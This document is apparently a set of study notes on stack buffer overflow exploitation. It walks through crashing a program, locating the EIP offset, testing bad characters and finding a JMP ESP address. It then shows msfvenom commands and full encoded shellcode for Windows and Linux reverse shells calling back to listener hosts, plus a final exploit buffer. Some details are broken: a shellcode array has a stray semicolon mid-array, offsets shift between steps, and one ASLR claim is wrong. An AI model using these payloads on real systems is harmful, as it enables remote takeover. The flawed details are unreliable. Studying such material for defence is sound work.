## Buffer Overflow

+ During execution of a program, one function calls another which calls another which calls another etc.
+ All functions in the chain are suspended until the last function returns its value.
+ All the information needed to start execution for the chain of functions once the value is returned, is contained in the part of memory called **the stack**.
+ **The stack** also contained stored local variables used by the program.
+ Problems arise when the program does not manage this memory correctly, most often when handling input to the program.

+ Buffer overflow happens when memory adjacent to what was allocated is overwritten, in the stack.  
  e.g. When char buffer[64] and we do something like strcpy(buffer, argv[1]), where argv[1] > 64 characters.

---

### CPU Registers and their flags
  These CPU registers help store program variables and data as the program runs.

 + **ESP** register
    Extended Stack Pointer most commonly points to the top of the running processes stack, allowing the program to push and pop values from the stack

    *** This ends up pointing to the position right after EIP when crashed

 + **EIP** register
    Extended Instruction Pointer holds the current address location for the instruction being executed at any given time.
    i.e. The EIP controls the path of execution for a program.  
    ** The goal of buffer overflow is to overwrite EIP to get control of program execution. **

+ **EAX** register
  Points to the start of user input.


+ To get to these values look for:
  - JMP ESP
  - CALL EAX
---

### Process to exploit Buffer Overflow

1. Replicate the crash
  This comprises writing a script that can be used to send the payload.
  Need to figure out how many characters leads to crash.

2. Control EIP

  2.1 Need to locate the location of the input that overwrites the EIP register.  
    Want to create a unique set of characters. This is done with 'pattern_create.rb'

    ```
    root@kali:~# locate pattern_create
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb

    root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
    ```

  2.2 Now when the program crashes, look at the value in EIP, this is the string contained at that time. In order to get the characters from the hex (use value in eip not reversed):

    ```
    root@kali:~# locate pattern_offset.rb
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb

    root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
    [*] Exact match at offset 524
    ```

  2.3 Once we have this edit the script to pinpoint the EIP values, for instance by setting them B:

  ```python
  st = 'A' * 524 + 'B' * 4 + 'C' * 72
  ```

3. Shellcode
  Get shellcode into memory, then point to it with EIP to have it executed.
  Typical reverse shell requires between 350 and 400 bytes of space.

  3.1 Increase the size of the payload to be big enough for reverse shell (350-400 bytes). Check if this changes the behaviour of the program.

  ```python
  st = 'A' * 524 + 'B' * 4 + 'C' * 400
  ```

  3.2 Indentify **bad characters** by sending all hex characters (00 - FF) to the buffer and checking how that affects program behaviour.

  ```
  # Step 5 - Check for bad characters
  badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

  st = 'A' * 524 + 'B' * 4 + badchars
  ```

4. Redirecting execution
  - Set the value of EIP to redirect to the memory address represented by the value in ESP at the time of the crash - to get this code executed next.
  - Hardcoding this address value does not work as this value changes between crashes (this is a stack address which changes often, especially in multi-threaded programs).
  - Need to find natural occurring code in the program or its modules that will do something like JMP ESP. If we find such an instruction, can point to that address instead. This address must be the same between iterations of the program and be readable & executable.
  - Immunity Debugger **Mona script**<br/>
  Used to quickly map modules in memory.<br/>
  To display all modules loaded in memory:<br/>

  ```
  !mona modules
  ```
  Now choose module with:
    1. no memory protection (ASLR / DEP)
    2. no bad character in memory range  
    3. not being rebased on each reboot

  If this application were compiled with DEP support, our JMP ESP address would have to be located in the code (.text) segment of the module, as that is the only segment with both Read (R) and Executable (E) permissions. However, since no DEP is enabled, we are free to use instructions from any address in this module.  

  After choosing module in script mode, click on "E" to see the executable modules.
  Now click on the module you chose. Immunity opens as the beginning of these instructions.
  In the program executable instruction window, right click: Search -> Command -> jmp esp
  This gives us the address of a suitable instruction.  

  If no instruction was found, search for instruction sequence. Search -> Sequence of commands  

  ```
  push esp
  ret
  ```

  If still not found, need to expand the search. Debugger will only search in the executable memory ranges, but since no DEP and no ASLR, we can search other areas as well.
  Mona can search for any given op-code in a memory range.
  To check what the op-code is, use nasm_shell.rb:

  ```
  #ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
  nasm > jmp esp
  00000000  FFE4        jmp esp
  nasm >
  ```

  So jmp esp = FFE4. Using mona:
  ```
  !mona find -s "\xff\xe4" [module_name]
  ```
  Choose a memory address that does not contain a bad character (311712F3)
  This is then written in the EIP characters. When using x86 architecture, the address is written in reverse (little endian architecture used)

5. Generating Shellcode with Metasploit

  **msfvenom:**

  + to list payloads:
  ```
  # msfvenom -l payloads
  ```

  + set payload - simple reverse TCP shell  

          -f c = C formatted shellcode
          -e x86/shikata_ga_nai = set the encoding
          -b "\x00\x0a\x0d" = set the bad characters

    ```
      # msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.8 LPORT=443 -f c -e x86/shikata_ga_nai -b "\xff" EXITFUNC=thread
      No platform was selected, choosing Msf::Module::Platform::Windows from the payload
      No Arch selected, selecting Arch: x86 from the payload
      Found 1 compatible encoders
      Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
      x86/shikata_ga_nai succeeded with size 360 (iteration=0)
      x86/shikata_ga_nai chosen with final size 360
      Payload size: 360 bytes
      Final size of c file: 1536 bytes
      unsigned char buf[] =
      "\xdd\xc0\xd9\x74\x24\xf4\x58\xbd\x83\xe0\xf7\x46\x31\xc9\xb1"
      "\x54\x31\x68\x18\x03\x68\x18\x83\xe8\x7f\x02\x02\xba\x97\x41"
      "\xed\x43\x67\x26\x67\xa6\x56\x66\x13\xa2\xc8\x56\x57\xe6\xe4"
      "\x1d\x35\x13\x7f\x53\x92\x14\xc8\xde\xc4\x1b\xc9\x73\x34\x3d"
      "\x49\x8e\x69\x9d\x70\x41\x7c\xdc\xb5\xbc\x8d\x8c\x6e\xca\x20"
      "\x21\x1b\x86\xf8\xca\x57\x06\x79\x2e\x2f\x29\xa8\xe1\x24\x70"
      "\x6a\x03\xe9\x08\x23\x1b\xee\x35\xfd\x90\xc4\xc2\xfc\x70\x15"
      "\x2a\x52\xbd\x9a\xd9\xaa\xf9\x1c\x02\xd9\xf3\x5f\xbf\xda\xc7"
      "\x22\x1b\x6e\xdc\x84\xe8\xc8\x38\x35\x3c\x8e\xcb\x39\x89\xc4"
      "\x94\x5d\x0c\x08\xaf\x59\x85\xaf\x60\xe8\xdd\x8b\xa4\xb1\x86"
      "\xb2\xfd\x1f\x68\xca\x1e\xc0\xd5\x6e\x54\xec\x02\x03\x37\x78"
      "\xe6\x2e\xc8\x78\x60\x38\xbb\x4a\x2f\x92\x53\xe6\xb8\x3c\xa3"
      "\x09\x93\xf9\x3b\xf4\x1c\xfa\x12\x32\x48\xaa\x0c\x93\xf1\x21"
      "\xcd\x1c\x24\xdf\xc8\x8a\xcd\x20\xd3\x42\xba\x22\xd3\x53\x81"
      "\xaa\x35\x03\xa5\xfc\xe9\xe3\x15\xbd\x59\x8b\x7f\x32\x85\xab"
      "\x7f\x98\xae\x41\x90\x75\x86\xfd\x09\xdc\x5c\x9c\xd6\xca\x18"
      "\x9e\x5d\xff\xdd\x50\x96\x8a\xcd\x84\xc7\x74\x0e\x54\x62\x75"
      "\x64\x50\x24\x22\x10\x5a\x11\x04\xbf\xa5\x74\x16\xb8\x59\x09"
      "\x2f\xb2\x6f\x9f\x0f\xac\x8f\x4f\x90\x2c\xd9\x05\x90\x44\xbd"
      "\x7d\xc3\x71\xc2\xab\x77\x2a\x56\x54\x2e\x9e\xf1\x3c\xcc\xf9"
      "\x35\xe3\x2f\x2c\x46\xe4\xd0\xb2\x6a\x4d\xb9\x4c\x2a\x6d\x39"
      "\x27\xaa\x3d\x51\xbc\x85\xb2\x91\x3d\x0c\x9b\xb9\xb4\xc0\x69"
      "\x5b\xc8\xc9\x2c\xc5\xc9\xfd\xf4\x10\x44\x02\x0b\x1d\xa6\x3f"
      "\xdd\x24\xdc\x78\xdd\x12\xef\x33\x40\x32\x7a\x3b\xd6\x44\xaf";
      "\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
      "\x53\xff\xd5";

      ```

    To create a Linux reverse shell:
    ```
    # msfpayload linux/x86/shell_reverse_tcp LPORT=4444 LHOST=192.168.1.104 R | msfencode -e x86/shikata_ga_nai -b "\x00"
    ```
    or this:
    ```
    # msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -e x86/shikata_ga_nai -b "\xff" -f c EXITFUNC=thread
    No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    No Arch selected, selecting Arch: x86 from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 95 (iteration=0)
    x86/shikata_ga_nai chosen with final size 95
    Payload size: 95 bytes
    Final size of c file: 425 bytes
    unsigned char buf[] =
    "\xbf\xda\x46\xb2\x07\xdb\xd8\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
    "\x12\x31\x7d\x12\x83\xed\xfc\x03\xa7\x48\x50\xf2\x66\x8e\x63"
    "\x1e\xdb\x73\xdf\x8b\xd9\xfa\x3e\xfb\xbb\x31\x40\x6f\x1a\x7a"
    "\x7e\x5d\x1c\x33\xf8\xa4\x74\x04\x52\x6e\xe2\xec\xa1\x8f\xfb"
    "\xb0\x2c\x6e\x4b\x2e\x7f\x20\xf8\x1c\x7c\x4b\x1f\xaf\x03\x19"
    "\xb7\x5e\x2b\xed\x2f\xf7\x1c\x3e\xcd\x6e\xea\xa3\x43\x22\x65"
    "\xc2\xd3\xcf\xb8\x85";
    ```

    Lastly, add some NOP instructions (\x90) at the beginning of the shell code.

    ```
    shellcode = "\xbf\xda\x46\xb2\x07\xdb\xd8\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
    "\x12\x31\x7d\x12\x83\xed\xfc\x03\xa7\x48\x50\xf2\x66\x8e\x63"
    "\x1e\xdb\x73\xdf\x8b\xd9\xfa\x3e\xfb\xbb\x31\x40\x6f\x1a\x7a"
    "\x7e\x5d\x1c\x33\xf8\xa4\x74\x04\x52\x6e\xe2\xec\xa1\x8f\xfb"
    "\xb0\x2c\x6e\x4b\x2e\x7f\x20\xf8\x1c\x7c\x4b\x1f\xaf\x03\x19"
    "\xb7\x5e\x2b\xed\x2f\xf7\x1c\x3e\xcd\x6e\xea\xa3\x43\x22\x65"
    "\xc2\xd3\xcf\xb8\x85"

    buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
    ```
---

### ASLR

+ To test if ASLR is enbaled on Linux:

  ```
  $ cat /proc/sys/kernel/randomize_va_space
  2
  ```
  The value 2 means ASLR is enabled

+ If ASLR is enabled, then non-executable stack.

  OPTIONS:
  1. ret2libc - Need to find system() in the executable code.
  2. Find JMP [register], a register that we can control.

  Both these techniques require objdump of binary, then look for code.
    search for "jmp eax" or "call eax" to use ret2eax
